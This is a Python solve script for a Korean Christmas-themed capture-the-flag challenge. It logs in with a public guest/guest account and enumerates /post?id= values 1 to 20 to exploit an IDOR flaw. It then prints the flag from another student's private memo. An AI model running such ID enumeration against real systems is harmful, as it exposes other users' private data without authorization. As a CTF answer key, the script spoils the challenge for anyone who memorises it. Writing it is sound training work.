#!/usr/bin/env python3
"""마니또 확인하기 - IDOR 자동 풀이 스크립트.

흐름:
  1) 공개된 체험 계정 guest / guest 로 로그인한다.
  2) 게시판 상세보기 URL /post?id= 의 id 를 1~20 으로 바꿔가며 순회한다 (IDOR).
  3) "내가 챙겨줄 친구" 가 guest 인 학생의 글을 찾는다.
  4) 그 학생의 메모에서 XMAS{...} 플래그를 출력한다.

사용법:
  python solve.py                       # 기본 http://localhost:8004
  python solve.py http://target:8004    # 대상 URL 지정
"""
import re
import sys

import requests

BASE = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://localhost:8004"

USERNAME = "guest"
PASSWORD = "guest"

FLAG_RE = re.compile(r"XMAS\{[^}]*\}")
# "내가 챙겨줄 친구" 블록의 이름을 뽑는다.
TARGET_RE = re.compile(
    r'내가 챙겨줄 친구.*?<div class="manito-name">(.*?)</div>', re.S
)


def main():
    s = requests.Session()

    # 1) 로그인
    r = s.post(
        f"{BASE}/login",
        data={"username": USERNAME, "password": PASSWORD},
        allow_redirects=True,
    )
    if "게시판" not in r.text:
        print("[-] 로그인 실패. 계정/URL 을 확인하세요.")
        sys.exit(1)
    print(f"[+] 로그인 성공 ({USERNAME})")

    # 2~4) IDOR: id 순회
    for sid in range(1, 21):
        r = s.get(f"{BASE}/post", params={"id": sid})
        if r.status_code != 200:
            continue
        m = TARGET_RE.search(r.text)
        target = m.group(1).strip() if m else "?"
        print(f"    id={sid:>2}  내가 챙겨줄 친구: {target}")
        if target == "guest":
            flag = FLAG_RE.search(r.text)
            print()
            print(f"[+] guest 를 챙겨주는 학생 발견! id={sid}")
            if flag:
                print(f"[+] FLAG: {flag.group(0)}")
            else:
                print("[-] 메모에서 플래그를 찾지 못했습니다.")
            return

    print("[-] guest 를 챙겨주는 학생을 찾지 못했습니다.")


if __name__ == "__main__":
    main()
